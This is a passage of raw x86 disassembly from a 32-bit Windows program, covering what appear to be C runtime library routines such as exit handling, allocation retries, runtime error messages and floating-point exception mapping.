  4025a6:	mov    eax,DWORD PTR [ebp-0x20]
  4025a9:	mov    BYTE PTR [eax],bl
  4025ab:	inc    DWORD PTR [ebp-0x20]
  4025ae:	jmp    0x4025c1
  4025b0:	lea    eax,[ebp-0x20]
  4025b3:	push   eax
  4025b4:	push   ebx
  4025b5:	call   0x40212c
  4025ba:	pop    ecx
  4025bb:	pop    ecx
  4025bc:	cmp    eax,0xffffffff
  4025bf:	je     0x4025e3
  4025c1:	dec    DWORD PTR [ebp-0x1c]
  4025c4:	js     0x4025cd
  4025c6:	mov    eax,DWORD PTR [ebp-0x20]
  4025c9:	mov    BYTE PTR [eax],bl
  4025cb:	jmp    0x4025de
  4025cd:	lea    eax,[ebp-0x20]
  4025d0:	push   eax
  4025d1:	push   ebx
  4025d2:	call   0x40212c
  4025d7:	pop    ecx
  4025d8:	pop    ecx
  4025d9:	cmp    eax,0xffffffff
  4025dc:	je     0x4025e3
  4025de:	mov    eax,DWORD PTR [ebp+0x14]
  4025e1:	jmp    0x4025f2
  4025e3:	xor    eax,eax
  4025e5:	cmp    DWORD PTR [ebp-0x1c],ebx
  4025e8:	mov    WORD PTR [esi+edi*2-0x2],ax
  4025ed:	setge  al
  4025f0:	dec    eax
  4025f1:	dec    eax
  4025f2:	pop    edi
  4025f3:	pop    esi
  4025f4:	pop    ebx
  4025f5:	leave  
  4025f6:	ret    
  4025f7:	mov    edi,edi
  4025f9:	push   ebp
  4025fa:	mov    ebp,esp
  4025fc:	push   esi
  4025fd:	xor    esi,esi
  4025ff:	cmp    DWORD PTR [ebp+0x10],esi
  402602:	jne    0x402621
  402604:	call   0x4024b6
  402609:	push   esi
  40260a:	push   esi
  40260b:	push   esi
  40260c:	push   esi
  40260d:	push   esi
  40260e:	mov    DWORD PTR [eax],0x16
  402614:	call   0x40244e
  402619:	add    esp,0x14
  40261c:	or     eax,0xffffffff
  40261f:	jmp    0x40267f
  402621:	push   edi
  402622:	mov    edi,DWORD PTR [ebp+0x8]
  402625:	cmp    edi,esi
  402627:	je     0x40262e
  402629:	cmp    DWORD PTR [ebp+0xc],esi
  40262c:	ja     0x40263b
  40262e:	call   0x4024b6
  402633:	mov    DWORD PTR [eax],0x16
  402639:	jmp    0x40266e
  40263b:	push   DWORD PTR [ebp+0x18]
  40263e:	push   DWORD PTR [ebp+0x14]
  402641:	push   DWORD PTR [ebp+0x10]
  402644:	push   DWORD PTR [ebp+0xc]
  402647:	push   edi
  402648:	push   0x4059e2
  40264d:	call   0x4024ff
  402652:	add    esp,0x18
  402655:	cmp    eax,esi
  402657:	jge    0x40265e
  402659:	xor    ecx,ecx
  40265b:	mov    WORD PTR [edi],cx
  40265e:	cmp    eax,0xfffffffe
  402661:	jne    0x40267e
  402663:	call   0x4024b6
  402668:	mov    DWORD PTR [eax],0x22
  40266e:	push   esi
  40266f:	push   esi
  402670:	push   esi
  402671:	push   esi
  402672:	push   esi
  402673:	call   0x40244e
  402678:	add    esp,0x14
  40267b:	or     eax,0xffffffff
  40267e:	pop    edi
  40267f:	pop    esi
  402680:	pop    ebp
  402681:	ret    
  402682:	push   0xc
  402684:	push   0x40c748
  402689:	call   0x403b74
  40268e:	mov    esi,DWORD PTR [ebp+0x8]
  402691:	test   esi,esi
  402693:	je     0x40270a
  402695:	cmp    DWORD PTR ds:0x41244c,0x3
  40269c:	jne    0x4026e1
  40269e:	push   0x4
  4026a0:	call   0x4066fe
  4026a5:	pop    ecx
  4026a6:	and    DWORD PTR [ebp-0x4],0x0
  4026aa:	push   esi
  4026ab:	call   0x406731
  4026b0:	pop    ecx
  4026b1:	mov    DWORD PTR [ebp-0x1c],eax
  4026b4:	test   eax,eax
  4026b6:	je     0x4026c1
  4026b8:	push   esi
  4026b9:	push   eax
  4026ba:	call   0x406761
  4026bf:	pop    ecx
  4026c0:	pop    ecx
  4026c1:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4026c8:	call   0x4026d8
  4026cd:	cmp    DWORD PTR [ebp-0x1c],0x0
  4026d1:	jne    0x40270a
  4026d3:	push   DWORD PTR [ebp+0x8]
  4026d6:	jmp    0x4026e2
  4026d8:	push   0x4
  4026da:	call   0x406624
  4026df:	pop    ecx
  4026e0:	ret    
  4026e1:	push   esi
  4026e2:	push   0x0
  4026e4:	push   DWORD PTR ds:0x40f7b4
  4026ea:	call   DWORD PTR ds:0x40b0b4
  4026f0:	test   eax,eax
  4026f2:	jne    0x40270a
  4026f4:	call   0x4024b6
  4026f9:	mov    esi,eax
  4026fb:	call   DWORD PTR ds:0x40b08c
  402701:	push   eax
  402702:	call   0x402474
  402707:	mov    DWORD PTR [esi],eax
  402709:	pop    ecx
  40270a:	call   0x403bb9
  40270f:	ret    
  402710:	mov    edi,edi
  402712:	push   ebp
  402713:	mov    ebp,esp
  402715:	mov    eax,0xffff
  40271a:	mov    ecx,eax
  40271c:	sub    esp,0x14
  40271f:	cmp    WORD PTR [ebp+0x8],cx
  402723:	je     0x4027c3
  402729:	push   ebx
  40272a:	push   DWORD PTR [ebp+0xc]
  40272d:	lea    ecx,[ebp-0x14]
  402730:	call   0x402290
  402735:	mov    eax,DWORD PTR [ebp-0x14]
  402738:	mov    ecx,DWORD PTR [eax+0x14]
  40273b:	xor    ebx,ebx
  40273d:	cmp    ecx,ebx
  40273f:	jne    0x402755
  402741:	mov    eax,DWORD PTR [ebp+0x8]
  402744:	lea    ecx,[eax-0x61]
  402747:	cmp    cx,0x19
  40274b:	ja     0x402750
  40274d:	add    eax,0xffffffe0
  402750:	movzx  eax,ax
  402753:	jmp    0x4027b6
  402755:	mov    edx,0x100
  40275a:	cmp    WORD PTR [ebp+0x8],dx
  40275e:	jae    0x402789
  402760:	lea    eax,[ebp-0x14]
  402763:	push   eax
  402764:	push   0x2
  402766:	push   DWORD PTR [ebp+0x8]
  402769:	call   0x40724f
  40276e:	add    esp,0xc
  402771:	test   eax,eax
  402773:	movzx  eax,WORD PTR [ebp+0x8]
  402777:	je     0x4027b6
  402779:	mov    ecx,DWORD PTR [ebp-0x14]
  40277c:	mov    ecx,DWORD PTR [ecx+0xd0]
  402782:	movzx  ax,BYTE PTR [ecx+eax*1]
  402787:	jmp    0x402750
  402789:	push   DWORD PTR [eax+0x4]
  40278c:	lea    eax,[ebp-0x4]
  40278f:	push   0x1
  402791:	push   eax
  402792:	push   0x1
  402794:	lea    eax,[ebp+0x8]
  402797:	push   eax
  402798:	push   0x200
  40279d:	push   ecx
  40279e:	lea    eax,[ebp-0x14]
  4027a1:	push   eax
  4027a2:	call   0x4071f8
  4027a7:	add    esp,0x20
  4027aa:	test   eax,eax
  4027ac:	movzx  eax,WORD PTR [ebp+0x8]
  4027b0:	je     0x4027b6
  4027b2:	movzx  eax,WORD PTR [ebp-0x4]
  4027b6:	cmp    BYTE PTR [ebp-0x8],bl
  4027b9:	je     0x4027c2
  4027bb:	mov    ecx,DWORD PTR [ebp-0xc]
  4027be:	and    DWORD PTR [ecx+0x70],0xfffffffd
  4027c2:	pop    ebx
  4027c3:	leave  
  4027c4:	ret    
  4027c5:	mov    edi,edi
  4027c7:	push   ebp
  4027c8:	mov    ebp,esp
  4027ca:	push   0x0
  4027cc:	push   DWORD PTR [ebp+0x8]
  4027cf:	call   0x402710
  4027d4:	pop    ecx
  4027d5:	pop    ecx
  4027d6:	pop    ebp
  4027d7:	ret    
  4027d8:	mov    edi,edi
  4027da:	push   ebp
  4027db:	mov    ebp,esp
  4027dd:	push   esi
  4027de:	push   edi
  4027df:	xor    esi,esi
  4027e1:	push   DWORD PTR [ebp+0x8]
  4027e4:	call   0x407328
  4027e9:	mov    edi,eax
  4027eb:	pop    ecx
  4027ec:	test   edi,edi
  4027ee:	jne    0x402817
  4027f0:	cmp    DWORD PTR ds:0x40f248,eax
  4027f6:	jbe    0x402817
  4027f8:	push   esi
  4027f9:	call   DWORD PTR ds:0x40b028
  4027ff:	lea    eax,[esi+0x3e8]
  402805:	cmp    eax,DWORD PTR ds:0x40f248
  40280b:	jbe    0x402810
  40280d:	or     eax,0xffffffff
  402810:	mov    esi,eax
  402812:	cmp    eax,0xffffffff
  402815:	jne    0x4027e1
  402817:	mov    eax,edi
  402819:	pop    edi
  40281a:	pop    esi
  40281b:	pop    ebp
  40281c:	ret    
  40281d:	mov    edi,edi
  40281f:	push   ebp
  402820:	mov    ebp,esp
  402822:	push   esi
  402823:	push   edi
  402824:	xor    esi,esi
  402826:	push   0x0
  402828:	push   DWORD PTR [ebp+0xc]
  40282b:	push   DWORD PTR [ebp+0x8]
  40282e:	call   0x4073f2
  402833:	mov    edi,eax
  402835:	add    esp,0xc
  402838:	test   edi,edi
  40283a:	jne    0x402863
  40283c:	cmp    DWORD PTR ds:0x40f248,eax
  402842:	jbe    0x402863
  402844:	push   esi
  402845:	call   DWORD PTR ds:0x40b028
  40284b:	lea    eax,[esi+0x3e8]
  402851:	cmp    eax,DWORD PTR ds:0x40f248
  402857:	jbe    0x40285c
  402859:	or     eax,0xffffffff
  40285c:	mov    esi,eax
  40285e:	cmp    eax,0xffffffff
  402861:	jne    0x402826
  402863:	mov    eax,edi
  402865:	pop    edi
  402866:	pop    esi
  402867:	pop    ebp
  402868:	ret    
  402869:	mov    edi,edi
  40286b:	push   ebp
  40286c:	mov    ebp,esp
  40286e:	push   esi
  40286f:	push   edi
  402870:	xor    esi,esi
  402872:	push   DWORD PTR [ebp+0xc]
  402875:	push   DWORD PTR [ebp+0x8]
  402878:	call   0x407510
  40287d:	mov    edi,eax
  40287f:	pop    ecx
  402880:	pop    ecx
  402881:	test   edi,edi
  402883:	jne    0x4028b1
  402885:	cmp    DWORD PTR [ebp+0xc],eax
  402888:	je     0x4028b1
  40288a:	cmp    DWORD PTR ds:0x40f248,eax
  402890:	jbe    0x4028b1
  402892:	push   esi
  402893:	call   DWORD PTR ds:0x40b028
  402899:	lea    eax,[esi+0x3e8]
  40289f:	cmp    eax,DWORD PTR ds:0x40f248
  4028a5:	jbe    0x4028aa
  4028a7:	or     eax,0xffffffff
  4028aa:	mov    esi,eax
  4028ac:	cmp    eax,0xffffffff
  4028af:	jne    0x402872
  4028b1:	mov    eax,edi
  4028b3:	pop    edi
  4028b4:	pop    esi
  4028b5:	pop    ebp
  4028b6:	ret    
  4028b7:	mov    edi,edi
  4028b9:	push   ebp
  4028ba:	mov    ebp,esp
  4028bc:	mov    eax,DWORD PTR [ebp+0x8]
  4028bf:	mov    eax,DWORD PTR [eax]
  4028c1:	cmp    DWORD PTR [eax],0xe06d7363
  4028c7:	jne    0x4028f3
  4028c9:	cmp    DWORD PTR [eax+0x10],0x3
  4028cd:	jne    0x4028f3
  4028cf:	mov    eax,DWORD PTR [eax+0x14]
  4028d2:	cmp    eax,0x19930520
  4028d7:	je     0x4028ee
  4028d9:	cmp    eax,0x19930521
  4028de:	je     0x4028ee
  4028e0:	cmp    eax,0x19930522
  4028e5:	je     0x4028ee
  4028e7:	cmp    eax,0x1994000
  4028ec:	jne    0x4028f3
  4028ee:	call   0x40772b
  4028f3:	xor    eax,eax
  4028f5:	pop    ebp
  4028f6:	ret    0x4
  4028f9:	push   0x4028b7
  4028fe:	call   DWORD PTR ds:0x40b0ac
  402904:	xor    eax,eax
  402906:	ret    
  402907:	mov    edi,edi
  402909:	push   ebp
  40290a:	mov    ebp,esp
  40290c:	push   edi
  40290d:	mov    edi,0x3e8
  402912:	push   edi
  402913:	call   DWORD PTR ds:0x40b028
  402919:	push   DWORD PTR [ebp+0x8]
  40291c:	call   DWORD PTR ds:0x40b0b8
  402922:	add    edi,0x3e8
  402928:	cmp    edi,0xea60
  40292e:	ja     0x402934
  402930:	test   eax,eax
  402932:	je     0x402912
  402934:	pop    edi
  402935:	pop    ebp
  402936:	ret    
  402937:	mov    edi,edi
  402939:	push   ebp
  40293a:	mov    ebp,esp
  40293c:	call   0x402dea
  402941:	push   DWORD PTR [ebp+0x8]
  402944:	call   0x402c3f
  402949:	push   DWORD PTR ds:0x40e180
  40294f:	call   0x40361f
  402954:	push   0xff
  402959:	call   eax
  40295b:	add    esp,0xc
  40295e:	pop    ebp
  40295f:	ret    
  402960:	mov    edi,edi
  402962:	push   ebp
  402963:	mov    ebp,esp
  402965:	push   0x40b29c
  40296a:	call   DWORD PTR ds:0x40b0b8
  402970:	test   eax,eax
  402972:	je     0x402989
  402974:	push   0x40b28c
  402979:	push   eax
  40297a:	call   DWORD PTR ds:0x40b084
  402980:	test   eax,eax
  402982:	je     0x402989
  402984:	push   DWORD PTR [ebp+0x8]
  402987:	call   eax
  402989:	pop    ebp
  40298a:	ret    
  40298b:	mov    edi,edi
  40298d:	push   ebp
  40298e:	mov    ebp,esp
  402990:	push   DWORD PTR [ebp+0x8]
  402993:	call   0x402960
  402998:	pop    ecx
  402999:	push   DWORD PTR [ebp+0x8]
  40299c:	call   DWORD PTR ds:0x40b0bc
  4029a2:	int3   
  4029a3:	push   0x8
  4029a5:	call   0x4066fe
  4029aa:	pop    ecx
  4029ab:	ret    
  4029ac:	push   0x8
  4029ae:	call   0x406624
  4029b3:	pop    ecx
  4029b4:	ret    
  4029b5:	mov    edi,edi
  4029b7:	push   ebp
  4029b8:	mov    ebp,esp
  4029ba:	push   esi
  4029bb:	mov    esi,eax
  4029bd:	jmp    0x4029ca
  4029bf:	mov    eax,DWORD PTR [esi]
  4029c1:	test   eax,eax
  4029c3:	je     0x4029c7
  4029c5:	call   eax
  4029c7:	add    esi,0x4
  4029ca:	cmp    esi,DWORD PTR [ebp+0x8]
  4029cd:	jb     0x4029bf
  4029cf:	pop    esi
  4029d0:	pop    ebp
  4029d1:	ret    
  4029d2:	mov    edi,edi
  4029d4:	push   ebp
  4029d5:	mov    ebp,esp
  4029d7:	push   esi
  4029d8:	mov    esi,DWORD PTR [ebp+0x8]
  4029db:	xor    eax,eax
  4029dd:	jmp    0x4029ee
  4029df:	test   eax,eax
  4029e1:	jne    0x4029f3
  4029e3:	mov    ecx,DWORD PTR [esi]
  4029e5:	test   ecx,ecx
  4029e7:	je     0x4029eb
  4029e9:	call   ecx
  4029eb:	add    esi,0x4
  4029ee:	cmp    esi,DWORD PTR [ebp+0xc]
  4029f1:	jb     0x4029df
  4029f3:	pop    esi
  4029f4:	pop    ebp
  4029f5:	ret    
  4029f6:	mov    edi,edi
  4029f8:	push   ebp
  4029f9:	mov    ebp,esp
  4029fb:	cmp    DWORD PTR ds:0x412570,0x0
  402a02:	je     0x402a1d
  402a04:	push   0x412570
  402a09:	call   0x407950
  402a0e:	pop    ecx
  402a0f:	test   eax,eax
  402a11:	je     0x402a1d
  402a13:	push   DWORD PTR [ebp+0x8]
  402a16:	call   DWORD PTR ds:0x412570
  402a1c:	pop    ecx
  402a1d:	call   0x4055cd
  402a22:	push   0x40b200
  402a27:	push   0x40b1e8
  402a2c:	call   0x4029d2
  402a31:	pop    ecx
  402a32:	pop    ecx
  402a33:	test   eax,eax
  402a35:	jne    0x402a79
  402a37:	push   0x40357e
  402a3c:	call   0x40789c
  402a41:	mov    eax,0x40b1e0
  402a46:	mov    DWORD PTR [esp],0x40b1e4
  402a4d:	call   0x4029b5
  402a52:	cmp    DWORD PTR ds:0x412574,0x0
  402a59:	pop    ecx
  402a5a:	je     0x402a77
  402a5c:	push   0x412574
  402a61:	call   0x407950
  402a66:	pop    ecx
  402a67:	test   eax,eax
  402a69:	je     0x402a77
  402a6b:	push   0x0
  402a6d:	push   0x2
  402a6f:	push   0x0
  402a71:	call   DWORD PTR ds:0x412574
  402a77:	xor    eax,eax
  402a79:	pop    ebp
  402a7a:	ret    
  402a7b:	push   0x18
  402a7d:	push   0x40c768
  402a82:	call   0x403b74
  402a87:	push   0x8
  402a89:	call   0x4066fe
  402a8e:	pop    ecx
  402a8f:	and    DWORD PTR [ebp-0x4],0x0
  402a93:	xor    ebx,ebx
  402a95:	inc    ebx
  402a96:	cmp    DWORD PTR ds:0x40f27c,ebx
  402a9c:	je     0x402b67
  402aa2:	mov    DWORD PTR ds:0x40f278,ebx
  402aa8:	mov    al,BYTE PTR [ebp+0x10]
  402aab:	mov    ds:0x40f274,al
  402ab0:	cmp    DWORD PTR [ebp+0xc],0x0
  402ab4:	jne    0x402b57
  402aba:	push   DWORD PTR ds:0x412568
  402ac0:	call   0x40361f
  402ac5:	pop    ecx
  402ac6:	mov    edi,eax
  402ac8:	mov    DWORD PTR [ebp-0x28],edi
  402acb:	test   edi,edi
  402acd:	je     0x402b47
  402acf:	push   DWORD PTR ds:0x412564
  402ad5:	call   0x40361f
  402ada:	pop    ecx
  402adb:	mov    esi,eax
  402add:	mov    DWORD PTR [ebp-0x24],esi
  402ae0:	mov    DWORD PTR [ebp-0x1c],edi
  402ae3:	mov    DWORD PTR [ebp-0x20],esi
  402ae6:	sub    esi,0x4
  402ae9:	mov    DWORD PTR [ebp-0x24],esi
  402aec:	cmp    esi,edi
  402aee:	jb     0x402b47
  402af0:	call   0x403616
  402af5:	cmp    DWORD PTR [esi],eax
  402af7:	je     0x402ae6
  402af9:	cmp    esi,edi
  402afb:	jb     0x402b47
  402afd:	push   DWORD PTR [esi]
  402aff:	call   0x40361f
  402b04:	mov    edi,eax
  402b06:	call   0x403616
  402b0b:	mov    DWORD PTR [esi],eax
  402b0d:	call   edi
  402b0f:	push   DWORD PTR ds:0x412568
  402b15:	call   0x40361f
  402b1a:	mov    edi,eax
  402b1c:	push   DWORD PTR ds:0x412564
  402b22:	call   0x40361f
  402b27:	add    esp,0xc
  402b2a:	cmp    DWORD PTR [ebp-0x1c],edi
  402b2d:	jne    0x402b34
  402b2f:	cmp    DWORD PTR [ebp-0x20],eax
  402b32:	je     0x402b42
  402b34:	mov    DWORD PTR [ebp-0x1c],edi
  402b37:	mov    DWORD PTR [ebp-0x28],edi
  402b3a:	mov    DWORD PTR [ebp-0x20],eax
  402b3d:	mov    esi,eax
  402b3f:	mov    DWORD PTR [ebp-0x24],esi
  402b42:	mov    edi,DWORD PTR [ebp-0x28]
  402b45:	jmp    0x402ae6
  402b47:	push   0x40b210
  402b4c:	mov    eax,0x40b204
  402b51:	call   0x4029b5
  402b56:	pop    ecx
  402b57:	push   0x40b218
  402b5c:	mov    eax,0x40b214
  402b61:	call   0x4029b5
  402b66:	pop    ecx
  402b67:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  402b6e:	call   0x402b92
  402b73:	cmp    DWORD PTR [ebp+0x10],0x0
  402b77:	jne    0x402ba1
  402b79:	mov    DWORD PTR ds:0x40f27c,ebx
  402b7f:	push   0x8
  402b81:	call   0x406624
  402b86:	pop    ecx
  402b87:	push   DWORD PTR [ebp+0x8]
  402b8a:	call   0x40298b
  402b8f:	xor    ebx,ebx
  402b91:	inc    ebx
  402b92:	cmp    DWORD PTR [ebp+0x10],0x0
  402b96:	je     0x402ba0
  402b98:	push   0x8
  402b9a:	call   0x406624
  402b9f:	pop    ecx
  402ba0:	ret    
  402ba1:	call   0x403bb9
  402ba6:	ret    
  402ba7:	mov    edi,edi
  402ba9:	push   ebp
  402baa:	mov    ebp,esp
  402bac:	push   0x0
  402bae:	push   0x0
  402bb0:	push   DWORD PTR [ebp+0x8]
  402bb3:	call   0x402a7b
  402bb8:	add    esp,0xc
  402bbb:	pop    ebp
  402bbc:	ret    
  402bbd:	mov    edi,edi
  402bbf:	push   ebp
  402bc0:	mov    ebp,esp
  402bc2:	push   0x0
  402bc4:	push   0x1
  402bc6:	push   DWORD PTR [ebp+0x8]
  402bc9:	call   0x402a7b
  402bce:	add    esp,0xc
  402bd1:	pop    ebp
  402bd2:	ret    
  402bd3:	push   0x1
  402bd5:	push   0x0
  402bd7:	push   0x0
  402bd9:	call   0x402a7b
  402bde:	add    esp,0xc
  402be1:	ret    
  402be2:	push   0x1
  402be4:	push   0x1
  402be6:	push   0x0
  402be8:	call   0x402a7b
  402bed:	add    esp,0xc
  402bf0:	ret    
  402bf1:	mov    edi,edi
  402bf3:	push   esi
  402bf4:	call   0x403616
  402bf9:	mov    esi,eax
  402bfb:	push   esi
  402bfc:	call   0x407cac
  402c01:	push   esi
  402c02:	call   0x407c3d
  402c07:	push   esi
  402c08:	call   0x402317
  402c0d:	push   esi
  402c0e:	call   0x407c2e
  402c13:	push   esi
  402c14:	call   0x407c1f
  402c19:	push   esi
  402c1a:	call   0x407a0d
  402c1f:	push   esi
  402c20:	call   0x402e23
  402c25:	push   esi
  402c26:	call   0x407764
  402c2b:	push   0x402bbd
  402c30:	call   0x4035a4
  402c35:	add    esp,0x24
  402c38:	mov    ds:0x40e180,eax
  402c3d:	pop    esi
  402c3e:	ret    
  402c3f:	mov    edi,edi
  402c41:	push   ebp
  402c42:	mov    ebp,esp
  402c44:	push   ecx
  402c45:	push   ecx
  402c46:	push   ebx
  402c47:	mov    ebx,DWORD PTR [ebp+0x8]
  402c4a:	push   esi
  402c4b:	push   edi
  402c4c:	xor    esi,esi
  402c4e:	xor    edi,edi
  402c50:	mov    DWORD PTR [ebp-0x4],edi
  402c53:	cmp    ebx,DWORD PTR [edi*8+0x40e188]
  402c5a:	je     0x402c65
  402c5c:	inc    edi
  402c5d:	mov    DWORD PTR [ebp-0x4],edi
  402c60:	cmp    edi,0x17
  402c63:	jb     0x402c53
  402c65:	cmp    edi,0x17
  402c68:	jae    0x402de5
  402c6e:	push   0x3
  402c70:	call   0x407fdf
  402c75:	pop    ecx
  402c76:	cmp    eax,0x1
  402c79:	je     0x402db3
  402c7f:	push   0x3
  402c81:	call   0x407fdf
  402c86:	pop    ecx
  402c87:	test   eax,eax
  402c89:	jne    0x402c98
  402c8b:	cmp    DWORD PTR ds:0x40e000,0x1
  402c92:	je     0x402db3
  402c98:	cmp    ebx,0xfc
  402c9e:	je     0x402de5
  402ca4:	push   0x40b858
  402ca9:	mov    ebx,0x314
  402cae:	push   ebx
  402caf:	mov    edi,0x40f280
  402cb4:	push   edi
  402cb5:	call   0x407f75
  402cba:	add    esp,0xc
  402cbd:	test   eax,eax
  402cbf:	je     0x402cce
  402cc1:	push   esi
  402cc2:	push   esi
  402cc3:	push   esi
  402cc4:	push   esi
  402cc5:	push   esi
  402cc6:	call   0x402326
  402ccb:	add    esp,0x14
  402cce:	push   0x104
  402cd3:	mov    esi,0x40f299
  402cd8:	push   esi
  402cd9:	push   0x0
  402cdb:	mov    BYTE PTR ds:0x40f39d,0x0
  402ce2:	call   DWORD PTR ds:0x40b0c8
  402ce8:	test   eax,eax
  402cea:	jne    0x402d12
  402cec:	push   0x40b840
  402cf1:	push   0x2fb
  402cf6:	push   esi
  402cf7:	call   0x407f75
  402cfc:	add    esp,0xc
  402cff:	test   eax,eax
  402d01:	je     0x402d12
  402d03:	xor    eax,eax
  402d05:	push   eax
  402d06:	push   eax
  402d07:	push   eax
  402d08:	push   eax
  402d09:	push   eax
  402d0a:	call   0x402326
  402d0f:	add    esp,0x14
  402d12:	push   esi
  402d13:	call   0x405610
  402d18:	inc    eax
  402d19:	pop    ecx
  402d1a:	cmp    eax,0x3c
  402d1d:	jbe    0x402d57
  402d1f:	push   esi
  402d20:	call   0x405610
  402d25:	sub    esi,0x3b
  402d28:	add    eax,esi
  402d2a:	push   0x3
  402d2c:	mov    ecx,0x40f594
  402d31:	push   0x40b83c
  402d36:	sub    ecx,eax
  402d38:	push   ecx
  402d39:	push   eax
  402d3a:	call   0x407ec0
  402d3f:	add    esp,0x14
  402d42:	test   eax,eax
  402d44:	je     0x402d57
  402d46:	xor    esi,esi
  402d48:	push   esi
  402d49:	push   esi
  402d4a:	push   esi
  402d4b:	push   esi
  402d4c:	push   esi
  402d4d:	call   0x402326
  402d52:	add    esp,0x14
  402d55:	jmp    0x402d59
  402d57:	xor    esi,esi
  402d59:	push   0x40b838
  402d5e:	push   ebx
  402d5f:	push   edi
  402d60:	call   0x407e4c
  402d65:	add    esp,0xc
  402d68:	test   eax,eax
  402d6a:	je     0x402d79
  402d6c:	push   esi
  402d6d:	push   esi
  402d6e:	push   esi
  402d6f:	push   esi
  402d70:	push   esi
  402d71:	call   0x402326
  402d76:	add    esp,0x14
  402d79:	mov    eax,DWORD PTR [ebp-0x4]
  402d7c:	push   DWORD PTR [eax*8+0x40e18c]
  402d83:	push   ebx
  402d84:	push   edi
  402d85:	call   0x407e4c
  402d8a:	add    esp,0xc
  402d8d:	test   eax,eax
  402d8f:	je     0x402d9e
  402d91:	push   esi
  402d92:	push   esi
  402d93:	push   esi
  402d94:	push   esi
  402d95:	push   esi
  402d96:	call   0x402326
  402d9b:	add    esp,0x14
  402d9e:	push   0x12010
  402da3:	push   0x40b810
  402da8:	push   edi
  402da9:	call   0x407ce3
  402dae:	add    esp,0xc
  402db1:	jmp    0x402de5
  402db3:	push   0xfffffff4
  402db5:	call   DWORD PTR ds:0x40b0c4
  402dbb:	mov    ebx,eax
  402dbd:	cmp    ebx,esi
  402dbf:	je     0x402de5
  402dc1:	cmp    ebx,0xffffffff
  402dc4:	je     0x402de5
  402dc6:	push   0x0
  402dc8:	lea    eax,[ebp-0x8]
  402dcb:	push   eax
  402dcc:	lea    esi,[edi*8+0x40e18c]
  402dd3:	push   DWORD PTR [esi]
  402dd5:	call   0x405610
  402dda:	pop    ecx
  402ddb:	push   eax
  402ddc:	push   DWORD PTR [esi]
  402dde:	push   ebx
  402ddf:	call   DWORD PTR ds:0x40b0c0
  402de5:	pop    edi
  402de6:	pop    esi
  402de7:	pop    ebx
  402de8:	leave  
  402de9:	ret    
  402dea:	push   0x3
  402dec:	call   0x407fdf
  402df1:	pop    ecx
  402df2:	cmp    eax,0x1
  402df5:	je     0x402e0c
  402df7:	push   0x3
  402df9:	call   0x407fdf
  402dfe:	pop    ecx
  402dff:	test   eax,eax
  402e01:	jne    0x402e22
  402e03:	cmp    DWORD PTR ds:0x40e000,0x1
  402e0a:	jne    0x402e22
  402e0c:	push   0xfc
  402e11:	call   0x402c3f
  402e16:	push   0xff
  402e1b:	call   0x402c3f
  402e20:	pop    ecx
  402e21:	pop    ecx
  402e22:	ret    
  402e23:	ret    
  402e24:	mov    edi,edi
  402e26:	push   ebp
  402e27:	mov    ebp,esp
  402e29:	push   ecx
  402e2a:	push   ecx
  402e2b:	push   esi
  402e2c:	call   0x4037f2
  402e31:	mov    esi,eax
  402e33:	test   esi,esi
  402e35:	je     0x402f81
  402e3b:	mov    edx,DWORD PTR [esi+0x5c]
  402e3e:	mov    eax,ds:0x40e24c
  402e43:	push   edi
  402e44:	mov    edi,DWORD PTR [ebp+0x8]
  402e47:	mov    ecx,edx
  402e49:	push   ebx
  402e4a:	cmp    DWORD PTR [ecx],edi
  402e4c:	je     0x402e5c
  402e4e:	mov    ebx,eax
  402e50:	imul   ebx,ebx,0xc
  402e53:	add    ecx,0xc
  402e56:	add    ebx,edx
  402e58:	cmp    ecx,ebx
  402e5a:	jb     0x402e4a
  402e5c:	imul   eax,eax,0xc
  402e5f:	add    eax,edx
  402e61:	cmp    ecx,eax
  402e63:	jae    0x402e6d
  402e65:	cmp    DWORD PTR [ecx],edi
  402e67:	jne    0x402e6d
  402e69:	mov    eax,ecx
  402e6b:	jmp    0x402e6f
  402e6d:	xor    eax,eax
  402e6f:	test   eax,eax
  402e71:	je     0x402e7d
  402e73:	mov    ebx,DWORD PTR [eax+0x8]
  402e76:	mov    DWORD PTR [ebp-0x4],ebx
  402e79:	test   ebx,ebx
  402e7b:	jne    0x402e84
  402e7d:	xor    eax,eax
  402e7f:	jmp    0x402f7f
  402e84:	cmp    ebx,0x5
  402e87:	jne    0x402e95
  402e89:	and    DWORD PTR [eax+0x8],0x0
  402e8d:	xor    eax,eax
  402e8f:	inc    eax
  402e90:	jmp    0x402f7f
  402e95:	cmp    ebx,0x1
  402e98:	je     0x402f7c
  402e9e:	mov    ecx,DWORD PTR [esi+0x60]
  402ea1:	mov    DWORD PTR [ebp-0x8],ecx
  402ea4:	mov    ecx,DWORD PTR [ebp+0xc]
  402ea7:	mov    DWORD PTR [esi+0x60],ecx
  402eaa:	mov    ecx,DWORD PTR [eax+0x4]
  402ead:	cmp    ecx,0x8
  402eb0:	jne    0x402f6e
  402eb6:	mov    ecx,DWORD PTR ds:0x40e240
  402ebc:	mov    edi,DWORD PTR ds:0x40e244
  402ec2:	mov    edx,ecx
  402ec4:	add    edi,ecx
  402ec6:	cmp    edx,edi
  402ec8:	jge    0x402eee
  402eca:	imul   ecx,ecx,0xc
  402ecd:	mov    edi,DWORD PTR [esi+0x5c]
  402ed0:	and    DWORD PTR [ecx+edi*1+0x8],0x0
  402ed5:	mov    edi,DWORD PTR ds:0x40e240
  402edb:	mov    ebx,DWORD PTR ds:0x40e244
  402ee1:	inc    edx
  402ee2:	add    ebx,edi
  402ee4:	add    ecx,0xc
  402ee7:	cmp    edx,ebx
  402ee9:	jl     0x402ecd
  402eeb:	mov    ebx,DWORD PTR [ebp-0x4]
  402eee:	mov    eax,DWORD PTR [eax]
  402ef0:	mov    edi,DWORD PTR [esi+0x64]
  402ef3:	cmp    eax,0xc000008e
  402ef8:	jne    0x402f03
  402efa:	mov    DWORD PTR [esi+0x64],0x83
  402f01:	jmp    0x402f61
  402f03:	cmp    eax,0xc0000090
  402f08:	jne    0x402f13
  402f0a:	mov    DWORD PTR [esi+0x64],0x81
  402f11:	jmp    0x402f61
  402f13:	cmp    eax,0xc0000091
  402f18:	jne    0x402f23
  402f1a:	mov    DWORD PTR [esi+0x64],0x84
  402f21:	jmp    0x402f61
  402f23:	cmp    eax,0xc0000093
  402f28:	jne    0x402f33
  402f2a:	mov    DWORD PTR [esi+0x64],0x85
  402f31:	jmp    0x402f61
  402f33:	cmp    eax,0xc000008d
  402f38:	jne    0x402f43
  402f3a:	mov    DWORD PTR [esi+0x64],0x82
  402f41:	jmp    0x402f61
  402f43:	cmp    eax,0xc000008f
